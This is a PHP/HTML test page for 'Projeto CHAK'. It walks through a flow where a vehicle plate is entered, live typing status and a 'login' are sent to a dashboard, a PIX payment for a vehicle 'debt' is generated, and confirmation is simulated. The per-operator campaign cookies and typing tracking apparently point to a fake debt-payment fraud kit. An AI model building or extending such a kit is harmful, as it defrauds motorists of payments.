<?php
// pages/teste/index.php

// Se não houver $pdo, significa que o arquivo foi acessado diretamente, e não pelo index.php raiz
if (!isset($pdo)) {
    require_once "../../db.php";
    require_once "../../base/utility.php";
    require_once "../../base/detect_device.php";
    $id_usuario = (int)($_COOKIE['campanha'] ?? $_SESSION['user_id'] ?? 1); 
    $page = 'teste';
    require_once "../../base/tracker.php";
}

// Garante que existam cookies básicos para o fluxo não quebrar
if (empty($_COOKIE['user_id'])) {
    $uniqueId = uniqid(mt_rand(), true);
    setcookie('user_id', $uniqueId, time() + (86400 * 30), "/");
    $_COOKIE['user_id'] = $uniqueId;
}

if (empty($_COOKIE['campanha'])) {
    setcookie('campanha', '1', time() + (86400 * 30), "/"); // ID de usuário padrão (chakal)
    $_COOKIE['campanha'] = '1';
}

if (empty($_COOKIE['Identity'])) {
    setcookie('Identity', 'chakal', time() + (86400 * 30), "/"); // Username padrão
    $_COOKIE['Identity'] = 'chakal';
}

?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Laboratório de Testes - Projeto CHAK</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; padding: 20px; background-color: #eef2f7; color: #333; }
        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); max-width: 500px; margin: 0 auto; }
        h1 { color: #2c3e50; text-align: center; margin-bottom: 10px; }
        h2 { color: #34495e; font-size: 1.2em; border-bottom: 2px solid #eee; padding-bottom: 10px; margin-bottom: 20px; }
        .step { margin-bottom: 25px; padding: 15px; border: 1px solid #e0e6ed; border-radius: 8px; }
        .step-title { font-weight: bold; margin-bottom: 10px; display: block; color: #555; }
        input[type="text"] { width: 100%; padding: 12px; margin-top: 5px; box-sizing: border-box; border: 1px solid #cbd5e0; border-radius: 6px; font-size: 16px; }
        button { background-color: #27ae60; color: white; padding: 12px 15px; border: none; border-radius: 6px; cursor: pointer; width: 100%; font-size: 16px; font-weight: bold; transition: background 0.3s; margin-top: 10px; }
        button:hover { background-color: #219150; }
        button:disabled { background-color: #a0aec0; cursor: not-allowed; }
        .status-badge { display: inline-block; padding: 4px 8px; border-radius: 4px; font-size: 0.85em; font-weight: bold; margin-top: 10px; }
        .pending { background-color: #fefcbf; color: #975a16; }
        .paid { background-color: #c6f6d5; color: #22543d; }
        .error { background-color: #fed7d7; color: #822727; }
        #pixResult { margin-top: 20px; padding: 15px; background-color: #f8fafc; border: 1px dashed #cbd5e0; border-radius: 6px; word-break: break-all; font-family: monospace; font-size: 0.9em; display: none; }
        .log-box { margin-top: 20px; font-size: 0.8em; color: #666; max-height: 100px; overflow-y: auto; padding: 10px; background: #f1f5f9; border-radius: 4px; }
    </style>
</head>
<body>

<div class="container">
    <h1>Sistema de Teste</h1>
    <h2>Fluxo Completo de Ponta a Ponta</h2>

    <!-- PASSO 1: Digitação -->
    <div class="step">
        <span class="step-title">1. Entrada de Dados</span>
        <div style="margin-bottom: 10px;">
            <label for="placa">Placa do Veículo:</label>
            <input type="text" id="placa" name="placa" placeholder="ABC-1234" value="TST-2026">
        </div>
        <div id="typingIndicator" style="font-size: 0.8em; color: #3182ce; margin-top: 5px; display: none;">📡 Enviando status de digitação...</div>
    </div>

    <!-- PASSO 2: Consulta e Registro -->
    <div class="step">
        <span class="step-title">2. Consulta de Débitos (Gera Login no Painel)</span>
        <button id="btnConsultar">Consultar e Registrar no Painel</button>
        <div id="consultarStatus"></div>
    </div>

    <!-- PASSO 3: Geração de PIX -->
    <div class="step" id="stepPix" style="display: none;">
        <span class="step-title">3. Pagamento</span>
        <button id="btnGerarPix" style="background-color: #3182ce;">Gerar PIX (R$ 10,00)</button>
        <div id="pixResult"></div>
    </div>

    <!-- PASSO 4: Acompanhamento e Simulação -->
    <div class="step" id="stepStatus" style="display: none;">
        <span class="step-title">4. Status do Pagamento</span>
        <div id="paymentStatus" class="status-badge pending">AGUARDANDO PAGAMENTO</div>
        <button id="btnSimularPago" style="background-color: #805ad5; margin-top: 15px;">Simular Confirmação (Webhook)</button>
    </div>

    <div class="log-box" id="logBox">
        <div>-- Log de Atividade --</div>
    </div>
</div>

<script>
    const inputPlaca = document.getElementById('placa');
    const btnConsultar = document.getElementById('btnConsultar');
    const btnGerarPix = document.getElementById('btnGerarPix');
    const btnSimularPago = document.getElementById('btnSimularPago');
    const pixResult = document.getElementById('pixResult');
    const paymentStatus = document.getElementById('paymentStatus');
    const logBox = document.getElementById('logBox');
    
    let currentRef = null;
    let pollInterval = null;

    function addLog(msg) {
        const div = document.createElement('div');
        div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
        logBox.appendChild(div);
        logBox.scrollTop = logBox.scrollHeight;
    }

    // --- 1. Typing Status ---
    let typingInterval = null;
    let stopTypingTimeout = null;

    inputPlaca.addEventListener('input', () => {
        document.getElementById('typingIndicator').style.display = 'block';
        if (!typingInterval) {
            fetch('../../api/typing_start.php');
            typingInterval = setInterval(() => fetch('../../api/typing_start.php'), 2000);
            addLog('Iniciou digitação');
        }
        clearTimeout(stopTypingTimeout);
        stopTypingTimeout = setTimeout(() => {
            clearInterval(typingInterval);
            typingInterval = null;
            document.getElementById('typingIndicator').style.display = 'none';
            addLog('Parou de digitar');
        }, 2000);
    });

    // --- 2. Consulta ---
    btnConsultar.addEventListener('click', () => {
        const placa = inputPlaca.value;
        if (!placa) return alert('Digite a placa');

        btnConsultar.disabled = true;
        btnConsultar.textContent = 'Consultando...';
        addLog(`Registrando consulta para placa: ${placa}`);

        // 2.1 Salva no conf (Mock para o fluxo técnico)
        fetch('../../api/salvar.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ tela: 'teste', doc: placa, bearer: 'teste_token' })
        });

        // 2.2 Registra o LOGIN real para aparecer no DASHBOARD
        const formData = new FormData();
        formData.append('placa', placa);

        fetch('record_login.php', {
            method: 'POST',
            body: formData
        })
        .then(res => res.json())
        .then(data => {
            addLog('✅ Consulta (Login) registrada no Dashboard!');
            document.getElementById('stepPix').style.display = 'block';
            btnConsultar.textContent = 'Consulta Realizada';
        })
        .catch(err => {
            addLog('Erro ao registrar login');
            document.getElementById('stepPix').style.display = 'block';
        });
    });

    // --- 3. Gerar PIX ---
    btnGerarPix.addEventListener('click', () => {
        btnGerarPix.disabled = true;
        btnGerarPix.textContent = 'Gerando PIX...';
        addLog('Solicitando geração de PIX');

        const formData = new FormData();
        formData.append('cpf_cnpj', inputPlaca.value);
        formData.append('nome', 'USUARIO TESTE');
        formData.append('valor', '10.00');
        formData.append('debito', 'Taxa de Teste CHAK');

        fetch('../../data/pix.php', { method: 'POST', body: formData })
        .then(res => res.json())
        .then(data => {
            if (data.status && data.pix) {
                // Priorizamos o ID do banco de dados para evitar que o webhook simule em massa
                currentRef = data.id || data.pix; 
                pixResult.textContent = data.pix;
                pixResult.style.display = 'block';
                document.getElementById('stepStatus').style.display = 'block';
                addLog(`PIX gerado com sucesso. ID da transação: ${data.id || 'N/A'}`);
                startPolling();
            } else {
                alert('Erro ao gerar PIX');
            }
        })
        .finally(() => {
            btnGerarPix.textContent = 'PIX Gerado';
        });
    });

    // --- 4. Polling e Simulação ---
    function startPolling() {
        if (pollInterval) clearInterval(pollInterval);
        addLog('Iniciando monitoramento do pagamento...');
        pollInterval = setInterval(() => {
            fetch(`get_status.php?ref=${encodeURIComponent(currentRef)}`)
            .then(res => res.json())
            .then(data => {
                if (data.payment_status === 'pago') {
                    paymentStatus.textContent = 'PAGAMENTO CONFIRMADO ✅';
                    paymentStatus.className = 'status-badge paid';
                    addLog('PAGAMENTO DETECTADO!');
                    clearInterval(pollInterval);
                    alert('Sucesso! O sistema detectou o pagamento.');
                }
            });
        }, 3000);
    }

    btnSimularPago.addEventListener('click', () => {
        addLog('Simulando envio de Webhook...');
        btnSimularPago.disabled = true;
        btnSimularPago.textContent = 'Simulando...';
        
        fetch(`simulate_webhook.php?ref=${encodeURIComponent(currentRef)}`)
        .then(res => res.json())
        .then(data => {
            if (data.status === 'success') {
                addLog('✅ Webhook: Sucesso! Transação marcada como paga.');
            } else {
                addLog('❌ Webhook: Erro ou transação já paga.');
                btnSimularPago.disabled = false;
                btnSimularPago.textContent = 'Simular Confirmação (Webhook)';
            }
        });
    });
</script>

</body>
</html>
